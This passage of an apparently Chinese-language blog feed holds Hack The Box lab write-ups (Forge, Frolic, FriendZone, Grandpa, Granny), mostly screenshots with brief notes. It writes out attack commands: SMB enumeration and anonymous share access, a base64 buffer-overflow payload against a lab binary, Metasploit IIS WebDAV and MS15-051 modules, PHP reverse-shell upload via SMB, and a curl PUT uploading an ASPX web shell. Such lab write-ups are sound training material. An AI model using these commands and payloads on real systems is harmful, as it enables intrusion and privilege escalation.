                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.5okmqw2lqh40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.2pe4fbb9b0s0.webp"
                     
                ></p>
<p>是不是可以通过ftp去读取用户的密钥文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.1zc5kng9mdcw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.35ywvkx9hdw0.webp"
                     
                ></p>
<p>复制到本地</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.57vwi8zx9cw0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.30v6gj9kepg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.41ttla7h0c00.webp"
                     
                ></p>
<p>这个文件貌似会在本地开放一个随机端口，选运行看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.62g8kqa1rm80.webp"
                     
                ></p>
<p>在建立一个连接，本地请求一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.76folt53tm40.webp"
                     
                ></p>
<p>连接密码在文件中包含有</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.2vgikunaoqs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.6u62lvkwibk0.webp"
                     
                ></p>
<p>这好像是查看一些系统信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.1x4ed2tlfon4.webp"
                     
                ></p>
<p>报错了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.5v7enka1azs0.webp"
                     
                ></p>
<p>这边也变了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.4ekv02jkae00.webp"
                     
                ></p>
<p>懂了，引入一个python os库，在进行执行系统命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Forge/image.3pcc0lpx3aw0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Frolic - HackTheBox</title>
    <url>/post/f72fd971108b/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.21ny47h7efwg.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.77794fdpfck0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2zwbmtpnyte0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.638w31tj9bw0.webp"
                     
                ></p>
<p>开放有两个http端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.53o2kmsdbzc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3qg7me14ndk0.webp"
                     
                ></p>
<p>弱口令登不上，扫目录</p>
<p>扫目录的过程中，看到445和139开放了Samba，也尝试一下</p>
<p><code>enum4linux -a 10.10.10.111</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5mui1e34l3g0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.6fupmjimq8s0.webp"
                     
                ></p>
<p><code>smbclient \\\\WORKGROUP\\print -I 10.10.10.111 -N</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.35p5y97603m0.webp"
                     
                ></p>
<p>没用</p>
<p>扫描目录结果</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2nzwmjnivuu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.4y3p3luirpc0.webp"
                     
                ></p>
<p>发现一个admin页面登录框</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.1e7td96ef4u8.webp"
                     
                ></p>
<p>不知道密码</p>
<p>backup下发现user.txt和password.txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.771cfv6ozbg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.7gqhymaqwxc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3kqf6ukuo4k0.webp"
                     
                ></p>
<p>用发现的账号密码去尝试登录admin页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.7c46yfexsl00.webp"
                     
                ></p>
<p>密码不对，而且还有登录限制</p>
<p>test页面是个phpinfo页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.785tbb4bxjc0.webp"
                     
                ></p>
<p>dev目录下面应该有东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5b4z5rl61ms0.webp"
                     
                ></p>
<p>继续扫</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2wkhq8w82rm0.webp"
                     
                ></p>
<p>dev&#x2F;test下载了一个文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5delpx0glcg0.webp"
                     
                ></p>
<p>没啥信息</p>
<p>dev&#x2F;backup下发现一个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3sy7hc2cv4a0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.1ediylhza2yo.webp"
                     
                ></p>
<p>打开发现是一个playsms的cms登录框</p>
<p>看看有没有exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2xvd0apgixo0.webp"
                     
                ></p>
<p>尝试过后发现大多都需要身份验证，最后一个给出了漏洞详细地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.4jjdjtk51oo0.webp"
                     
                ></p>
<p><code>https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.12a7tnvnnouo.webp"
                     
                ></p>
<p>貌似是个ssti注入，payload给出来了，试试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.6yomwwvcfn00.webp"
                     
                ></p>
<p>可行，弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.66a35thjz700.webp"
                     
                ></p>
<p>准备个php反弹文件，让他下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3m5tixh2a820.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.29h5sicm3ce8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.38gpnb2xkhq0.webp"
                     
                ></p>
<p>pkexec和脏牛，但这靶机同样gcc编译问题，无法编译exp，而且，就算在本地静态编译好后让靶机下载，还是无法运行</p>
<p>在ayush家目录.binary下找到一个rop二进制文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3kdiu0vxw3o0.webp"
                     
                ></p>
<p>按官方解法应该是缓冲区溢出，找了半天找到个wp，但真麻烦啊，而且目前已知消息是官方已经取消了缓冲区溢出考点，所以，懒得动手了，找了个exp直接一把梭哈</p>
<p><code>https://bigb0ss.medium.com/htb-frolic-writeup-936f81e6a1e0</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.94sd7t5pxr0.webp"
                     
                ></p>
<p>这是python2写的，简单修改一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5r2x8nwuv800.webp"
                     
                ></p>
<p>之后运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5ulqti874fw0.webp"
                     
                ></p>
<p><code>echo -n &quot;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=&quot; | base64 -d &gt; /dev/shm/payload</code></p>
<p><code>./rop $(cat /dev/shm/payload)</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.22r4wq8iw60w.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>FriendZone - HackTheBox</title>
    <url>/post/4aaf4f6939f1/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.wkx463snizk.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.4apc5mega980.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.1tzyb78mjg9s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.5wd5lxdp6ww0.webp"
                     
                ></p>
<p>443发现有域名，枚举一下子域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.29gdfmupkwkk.webp"
                     
                ></p>
<p>添加至hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.3nw5bnboh940.webp"
                     
                ></p>
<p>看看443端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.6gsvmzi7ysw0.webp"
                     
                ></p>
<p>在administraotr1域名下发现一个登录框</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.7kul72wrlj40.webp"
                     
                ></p>
<p>不管输入的是什么，都是一个提示</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.7ky4t0mkoaw0.webp"
                     
                ></p>
<p>另一个页面貌似是个上传点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.v2gw76d1emo.webp"
                     
                ></p>
<p>传个php看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.7k2m8c2gxc8.webp"
                     
                ></p>
<p>好像是传上去了，但是找不到文件路径</p>
<p>445端口有个smbd服务，试试能不能连上去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.4qebo2hwlsm0.webp"
                     
                ></p>
<p><code>enum4linux -a 10.10.10.123</code>、<code>cme smb 10.10.10.123</code>、<code>cme smb 10.10.10.123 -u &quot;&quot; -p &quot;&quot; --shares</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.v86hjhxvxkw.webp"
                     
                ></p>
<p><code>smbclient \\\\WORKGROUP\\general -I 10.10.10.123 -N</code>、<code>impacket-smbclient guest@10.10.10.123 -no-pass</code>，进入之后输入help查看命令使用，<code>shares</code>：查看共享文件夹，<code>use general</code>，进入文件夹，<code>ls</code>查看文件夹中的文件信息，之后<code>get creds.txt</code>下载文件到本地</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.62v3tqp06so0.webp"
                     
                ></p>
<p>发现一个txt文本，get下来</p>
<p><code>get creds.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.i8vbkhmrywg.webp"
                     
                ></p>
<p>获取到了admin用户账号密码</p>
<p>登录smb服务<code>cme smb 10.10.10.123 -u admin -p &#39;密码&#39; --shares</code>，登录ssh服务<code>cme smb 10.10.10.123 -u admin -p &#39;密码&#39;</code></p>
<p>登录80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.1geoocdgcc1s.webp"
                     
                ></p>
<p>访问dashboard.php</p>
<p>拼接url</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.3dcv4fm9fas0.webp"
                     
                ></p>
<p>感觉这里像是一个文件包含，试试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.5n172trpib40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.6y2rzmy140s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.55u92gfem5k0.webp"
                     
                ></p>
<p>这里就很明显了，代码中在包含文件的时候，会给文件加上一个.php后缀，如果远程包含一个带有php后门的代码，就可以触发</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.4offhc5r3xg0.webp"
                     
                ></p>
<p>好像不能直接远程包含</p>
<p>smbclient可以用于上传文件</p>
<p><code>smbclient \\\\WORKGROUP\\Development -c &quot;put test.php test.php&quot; -I 10.10.10.123 -N</code>、<code>impacket-smbclient guest@10.10.10.123 -no-pass</code>，进入之后输入help查看命令使用，<code>shares</code>：查看共享文件夹，<code>use Development</code>，进入文件夹，<code>put test.php</code>，上传文件</p>
<p>上github找一个php的反弹后门</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.3jt1ja2nvga0.webp"
                     
                ></p>
<p>修改一下反弹的IP和端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.795r4pytpxs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.m81bk9z43wg.webp"
                     
                ></p>
<p>上传成功，去包含执行一下</p>
<p>路径不好猜啊</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.1vddr3ei0jhc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.3umv0ozsdc20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.57b84ab35340.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.6fq6kifhlas0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.31v49y3xouu0.webp"
                     
                ></p>
<p>有个CVE，但是exp都是c写的，靶机没有gcc，无法编译</p>
<p>脚本也没检测到啥东西，再用pspy64看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.4lpnl94w4fi0.webp"
                     
                ></p>
<p>这有个以root权限执行的命令，看看源文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.965zqx10eqc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.7d4tl3tg8z40.webp"
                     
                ></p>
<p>无权写入，但可以尝试能否修改引用的os库</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.2qbaznxjzfo0.webp"
                     
                ></p>
<p>第一个没权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.f3xjn8dfcog.webp"
                     
                ></p>
<p>第二个可写，进行写入</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.5qbjt9jebtc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.6msi9rrin2w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.6ctm3ds5vls0.webp"
                     
                ></p>
<p>监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.3cbubbgprxu0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Grandpa - HackTheBox</title>
    <url>/post/34d9f4dbd4e3/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.6a922lewo400.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.cn480gcwxag.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.5cda9z27hlg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.30brvtidaq8.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.6t5jit49cps0.webp"
                     
                ></p>
<p>这个貌似和之前打过的granny是一致的，同样为iis 6.0</p>
<p>直接上exp<code>https://github.com/k4u5h41/CVE-2017-7269/blob/main/ii6_reverse_shell.py</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.2ava1o2y69j4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.1670r178lcxs.webp"
                     
                ></p>
<p>提权</p>
<p>反弹回来的同样是一个cmd命令框，再次采用iis 6.0 PUT上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.46hsuu0scre0.webp"
                     
                ></p>
<p>但是貌似这次不行，死活传不上去</p>
<p>开启一个smb服务也不行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.311hbj7rlcy0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4m4x0pbmbc80.webp"
                     
                ></p>
<p>实在没法，只能用msf来打了</p>
<p><code>use exploit/windows/iis/iis_webdav_scstoragepathfromurl</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.3gz8b7o0s2s0.webp"
                     
                ></p>
<p>设置IP和端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.xbwd4qu030g.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.3ra8r8p80g20.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.31umjwfynx40.webp"
                     
                ></p>
<p>进程注入</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4hlkcsjbfek0.webp"
                     
                ></p>
<p>继续提权</p>
<p><code>run post/multi/recon/local_exploit_suggester</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.ayk89gh87ao.webp"
                     
                ></p>
<p>利用MS15-051提权</p>
<p><code>use exploit/windows/local/ms15_051_client_copy_image</code></p>
<p>修改ip端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4pvf32ovkq20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.gz317zw97a8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.50sz9n78rdo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.7edx26se64w0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.7g0lpcznj580.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Granny - HackTheBox</title>
    <url>/post/606c77a3b5fd/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.vgxyrvc7ps0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.5fdhwnd1ixc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.4nngsa6r69i0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.5lugodb6fjk0.webp"
                     
                ></p>
<p>80端口开放的IIS服务为6.0，且扫描结果中显示支持put以及move等方法，此时即可利用IIS6.0的PUT方法进行上传shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Granny/image.641jlddkqj80.webp"
                     
                ></p>
<p>先将shell以txt文件形式上传</p>
<p><code>curl -X PUT http://10.10.10.15/test.txt --data-binary @cmdasp.aspx -vvvvv</code></p>
<p><img  
                     lazyload
                     alt="image"
